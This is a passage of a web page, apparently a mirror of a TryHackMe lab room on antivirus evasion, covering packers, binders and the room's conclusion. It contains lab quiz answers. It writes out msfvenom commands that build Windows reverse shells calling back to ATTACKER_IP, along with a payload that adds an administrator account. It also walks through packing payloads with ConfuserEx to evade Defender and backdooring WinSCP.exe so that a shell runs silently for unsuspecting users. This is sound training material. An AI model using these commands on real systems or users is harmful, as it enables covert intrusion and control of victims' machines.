plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>This payload takes a shellcode generated by msfvenom and runs it into a separate thread. For this to work, you&#x27;ll need to generate a new shellcode and put it into the <code>shellcode</code> variable of the code:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Command Prompt</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/shell_reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7478</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> csharp</span><br></span></code></pre></div></div>
<p>You can then compile your payload in the Windows machine using the following command:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Command Prompt</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc UnEncStagelessPayload.cs</span><br></span></code></pre></div></div>
<p>Once you have a working executable, you can try uploading it to the THM Antivirus Check! page (link on the desktop). It should be flagged by the AV immediately. Let&#x27;s use a packer on the same payload and see what happens.</p>
<p>We will use the <a href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0" target="_blank" rel="noopener noreferrer" class="">ConfuserEx</a> packer for this task, as our payloads are programmed on <code>.NET</code>. For your convenience, you can find a shortcut on your desktop to it.</p>
<p>ConfuserEx will require you to indicate the folders in which it will work. Be sure to select your desktop as the base directory, as shown in the image below. Once the base directory is set up, drag and drop the executable you want to pack on the interface, and you should end up with the following:</p>
<p><img decoding="async" loading="lazy" alt="Packer config part1" src="/TryHackMe-CN/en/assets/images/image_20251110-191013-219b65a0e191f8c72e1191c5c1f46504.png" width="780" height="586" class="img_ev3q"></p>
<p>Let&#x27;s go to the settings tab and select our payload. Once selected, hit the &quot;+&quot; button to add settings to your payload. This should create a rule named &quot;true&quot;. Make sure to enable compression as well:</p>
<p><img decoding="async" loading="lazy" alt="Packer config part2" src="/TryHackMe-CN/en/assets/images/image_20251110-191034-710ad3b00d828cbff025ad040e313c4f.png" width="780" height="585" class="img_ev3q"></p>
<p>We will now edit the &quot;true&quot; rule and set it to the Maximum preset:</p>
<p><img decoding="async" loading="lazy" alt="packer config part3" src="/TryHackMe-CN/en/assets/images/image_20251111-191147-0609c4588f5a54145e705e530551430e.png" width="386" height="593" class="img_ev3q"></p>
<p>Finally, we will go to the &quot;Protect!&quot; tab and hit &quot;Protect&quot;:</p>
<p><img decoding="async" loading="lazy" alt="packer config part 4" src="/TryHackMe-CN/en/assets/images/image_20251112-191201-2e401c6320c03304a82e438009796c8d.png" width="779" height="586" class="img_ev3q"></p>
<p>The new payload should be ready and hopefully won&#x27;t trigger any alarms when uploaded to the THM Antivirus Checker! (shortcut available on your desktop). In fact, if you execute your payload and set up an <code>nc</code> listener, you should be able to get a shell back:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@attackbox$ </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7478</span><br></span></code></pre></div></div>
<p>So far, so good, but remember we talked about AVs doing in-memory scanning? If you try running a command on your reverse shell, the AV will notice your shell and kill it. This is because Windows Defender will hook certain Windows API calls and do in-memory scanning whenever such API calls are used. In the case of any shell generated with msfvenom, CreateProcess() will be invoked and detected.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="so-what-do-we-do-now">So what do we do now?<a href="#so-what-do-we-do-now" class="hash-link" aria-label="Direct link to So what do we do now?" title="Direct link to So what do we do now?" translate="no">​</a></h3>
<p>While defeating in-memory scanning is out of the scope of this room, there are a couple of simple things you can do to avoid detection:</p>
<ul>
<li class=""><strong>Just wait a bit</strong>. Try spawning the reverse shell again and wait for around 5 minutes before sending any command. You&#x27;ll see the AV won&#x27;t complain anymore. The reason for this is that scanning memory is an expensive operation. Therefore, the AV will do it for a while after your process starts but will eventually stop.</li>
<li class=""><strong>Use smaller payloads</strong>. The smaller the payload, the less likely it is to be detected. If you use msfvenom to get a single command executed instead of a reverse shell, the AV will have a harder time detecting it. You can try with <code>msfvenom -a x64 -p windows/x64/exec CMD=&#x27;net user pwnd Password321 /add;net localgroup administrators pwnd /add&#x27; -f csharp</code> and see what happens.</li>
</ul>
<p>If detection isn&#x27;t an issue, you can even use a simple trick. From your reverse shell, run cmd.exe again. The AV will detect your payload and kill the associated process, but not the new cmd.exe you just spawned.</p>
<p>While every single AV will behave differently, most of the time, there will be a similar way around them, so it&#x27;s worth exploring any weird behaviors you notice while testing.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Will packers help you obfuscate your malicious code to bypass AV solutions? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Will packers often unpack the original code in-memory before running it? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Are some packers detected as malicious by some AV solutions? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Follow the instructions to create a packed payload and upload it into the THM Antivirus Check at <code>http://MACHINE_IP/</code> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-10-binders">Task 10 Binders<a href="#task-10-binders" class="hash-link" aria-label="Direct link to Task 10 Binders" title="Direct link to Task 10 Binders" translate="no">​</a></h2>
<p>While not an AV bypass method, binders are also important when designing a malicious payload to be distributed to end users. A <strong>binder</strong> is a program that merges two (or more) executables into a single one. It is often used when you want to distribute your payload hidden inside another known program to fool users into believing they are executing a different program.</p>
<p><img decoding="async" loading="lazy" alt="binder" src="/TryHackMe-CN/en/assets/images/image_20251117-191753-0a247d89aedbd936d8d4388d2d2d0992.png" width="1386" height="802" class="img_ev3q"></p>
<p>While every single binder might work slightly differently, they will basically add the code of your shellcode inside the legitimate program and have it executed somehow.</p>
<p>You could, for example, change the entry point in the PE header so that your shellcode executes right before the program and then redirect the execution back to the legitimate program once it is finished. This way, when the user clicks the resulting executable, your shellcode will get silently executed first and continue running the program normally without the user noticing it.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="binding-with-msfvenom">Binding with msfvenom<a href="#binding-with-msfvenom" class="hash-link" aria-label="Direct link to Binding with msfvenom" title="Direct link to Binding with msfvenom" translate="no">​</a></h3>
<p>You can easily plant a payload of your preference in any .exe file with <code>msfvenom</code>. The binary will still work as usual but execute an additional payload silently. The method used by msfvenom injects your malicious program by creating an extra thread for it, so it is slightly different from what was mentioned before but achieves the same result. Having a separate thread is even better since your program won&#x27;t get blocked in case your shellcode fails for some reason.</p>
<p>For this task, we will be backdooring the WinSCP executable available at <code>C:\Tools\WinSCP</code>.</p>
<p>To create a backdoored WinSCP.exe we can use the following command on our Windows machine:</p>
<p><strong>Note</strong>: Metasploit is installed in the Windows machine for your convenience, but it might take up to three minutes to generate the payload (the produced warnings can be safely ignored).</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">AttackBox</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> msfvenom </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> WinSCP.exe </span><span class="token parameter variable" style="color:#36acaa">-k</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/shell_reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">lhost</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">lport</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7779</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> exe </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> WinSCP-evil.exe</span><br></span></code></pre></div></div>
<p>The resulting WinSCP-evil.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Before anything else, remember to set up an <code>nc</code> listener to receive the reverse shell. When you execute your backdoored executable, it should launch a reverse shell back at you while continuing to execute WinSCP.exe for the user:</p>
<p><img decoding="async" loading="lazy" alt="img" src="/TryHackMe-CN/en/assets/images/image_20251119-191917-0ce07598d311293756197d9da2563671.png" width="1845" height="573" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="binders-and-av">Binders and AV<a href="#binders-and-av" class="hash-link" aria-label="Direct link to Binders and AV" title="Direct link to Binders and AV" translate="no">​</a></h3>
<p>Binders won&#x27;t do much to hide your payload from an AV solution. The simple fact of joining two executables without any changes means that the resulting executable will still trigger any signature that the original payload did.</p>
<p>The main use of binders is to fool users into believing they are executing a legitimate executable rather than a malicious payload.</p>
<p>When creating a real payload, you may want to use encoders, crypters, or packers to hide your shellcode from signature-based AVs and then bind it into a known executable so that the user doesn&#x27;t know what is being executed.</p>
<p>Feel free to try and upload your bound executable to the THM Antivirus Check website (link available on your desktop) without any packing, and you should get a detection back from the server, so this method won&#x27;t be of much help when trying to get the flag from the server by itself.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Will a binder help with bypassing AV solutions? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nay</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Can a binder be used to make a payload appear as a legitimate executable? (yea/nay) </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yea</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-11-conclusion">Task 11 Conclusion<a href="#task-11-conclusion" class="hash-link" aria-label="Direct link to Task 11 Conclusion" title="Direct link to Task 11 Conclusion" translate="no">​</a></h2>
<p>In this room, we have explored some strategies available to an attacker to circumvent AV engines that rely on disk-based detection only. While this is just one of the mechanisms available to any modern AV engine, we should be able to at least deliver our payloads to our victim&#x27;s disk as a first step. Bypassing in-memory detection and other advanced detection mechanisms are left for a future room. You may want to check the <a href="https://tryhackme.com/room/runtimedetectionevasion" target="_blank" rel="noopener noreferrer" class="">Runtime Detection Evasion</a> for more information on bypassing further Windows security mechanisms that may prevent your payloads from triggering.</p>
<p>Remember that the success of any encrypter, encoder or packer, will largely depend on AV engines not knowing any signatures for them. Therefore, being able to customize your own payloads is critical when trying to bypass any real-world solution.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Click and continue learning! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Host Evasions/avevasionshellcode.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Host Evasions</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/en/docs/Modules/Host Evasions/obfuscationprinciples"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Obfuscation Principles</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1-introduction" class="table-of-contents__link toc-highlight">Task 1 Introduction</a><ul><li><a href="#objectives" class="table-of-contents__link toc-highlight">Objectives</a></li><li><a href="#prerequisites" class="table-of-contents__link toc-highlight">Prerequisites</a></li></ul></li><li><a href="#task-2-challenge" class="table-of-contents__link toc-highlight">Task 2 Challenge</a></li><li><a href="#task-3-pe-structure" class="table-of-contents__link toc-highlight">Task 3 PE Structure</a><ul><li><a href="#what-is-pe" class="table-of-contents__link toc-highlight">What is PE?</a></li><li><a href="#why-do-we-need-to-know-about-pe" class="table-of-contents__link toc-highlight">Why do we need to know about PE?</a></li><li><a href="#pe-bear" class="table-of-contents__link toc-highlight">PE-Bear</a></li></ul></li><li><a href="#task-4-introduction-to-shellcode" class="table-of-contents__link toc-highlight">Task 4 Introduction to Shellcode</a><ul><li><a href="#a-simple-shellcode" class="table-of-contents__link toc-highlight">A Simple Shellcode</a></li></ul></li><li><a href="#task-5-generate-shellcode" class="table-of-contents__link toc-highlight">Task 5 Generate Shellcode</a><ul><li><a href="#generate-shellcode-using-public-tools" class="table-of-contents__link toc-highlight">Generate shellcode using Public Tools</a></li><li><a href="#shellcode-injection" class="table-of-contents__link toc-highlight">Shellcode injection</a></li><li><a href="#generate-shellcode-from-exe-files" class="table-of-contents__link toc-highlight">Generate Shellcode from EXE files</a></li></ul></li><li><a href="#task-6-staged-payloads" class="table-of-contents__link toc-highlight">Task 6 Staged Payloads</a><ul><li><a href="#stageless-payloads" class="table-of-contents__link toc-highlight">Stageless Payloads</a></li><li><a href="#staged-payloads" class="table-of-contents__link toc-highlight">Staged Payloads</a></li><li><a href="#staged-vs-stageless" class="table-of-contents__link toc-highlight">Staged vs. Stageless</a></li><li><a href="#stagers-in-metasploit" class="table-of-contents__link toc-highlight">Stagers in Metasploit</a></li><li><a href="#creating-your-own-stager" class="table-of-contents__link toc-highlight">Creating Your Own Stager</a></li><li><a href="#using-our-stager-to-run-a-reverse-shell" class="table-of-contents__link toc-highlight">Using our stager to run a reverse shell</a></li></ul></li><li><a href="#task-7-introduction-to-encoding-and-encryption" class="table-of-contents__link toc-highlight">Task 7 Introduction to Encoding and Encryption</a><ul><li><a href="#what-is-encoding" class="table-of-contents__link toc-highlight">What is Encoding?</a></li><li><a href="#what-is-encryption" class="table-of-contents__link toc-highlight">What is Encryption?</a></li><li><a href="#why-do-we-need-to-know-about-encoding-and-encryption" class="table-of-contents__link toc-highlight">Why do we Need to Know About Encoding and Encryption?</a></li></ul></li><li><a href="#task-8-shellcode-encoding-and-encryption" class="table-of-contents__link toc-highlight">Task 8 Shellcode Encoding and Encryption</a><ul><li><a href="#encode-using-msfvenom" class="table-of-contents__link toc-highlight">Encode using MSFVenom</a></li><li><a href="#encryption-using-msfvenom" class="table-of-contents__link toc-highlight">Encryption using MSFVenom</a></li><li><a href="#creating-a-custom-payload" class="table-of-contents__link toc-highlight">Creating a Custom Payload</a></li><li><a href="#the-encoder" class="table-of-contents__link toc-highlight">The Encoder</a></li><li><a href="#self-decoding-payload" class="table-of-contents__link toc-highlight">Self-decoding Payload</a></li></ul></li><li><a href="#task-9-packers" class="table-of-contents__link toc-highlight">Task 9 Packers</a><ul><li><a href="#packing-an-application" class="table-of-contents__link toc-highlight">Packing an application</a></li><li><a href="#packers-and-avs" class="table-of-contents__link toc-highlight">Packers and AVs</a></li><li><a href="#packing-our-shellcode" class="table-of-contents__link toc-highlight">Packing our shellcode</a></li><li><a href="#so-what-do-we-do-now" class="table-of-contents__link toc-highlight">So what do we do now?</a></li></ul></li><li><a href="#task-10-binders" class="table-of-contents__link toc-highlight">Task 10 Binders</a><ul><li><a href="#binding-with-msfvenom" class="table-of-contents__link toc-highlight">Binding with msfvenom</a></li><li><a href="#binders-and-av" class="table-of-contents__link toc-highlight">Binders and AV</a></li></ul></li><li><a href="#task-11-conclusion" class="table-of-contents__link toc-highlight">Task 11 Conclusion</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/en/docs">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/TryHackMyOffsecBox" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - TryHackMyOffsecBox<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/CRONUS-Security" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - CRONUS-Security<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>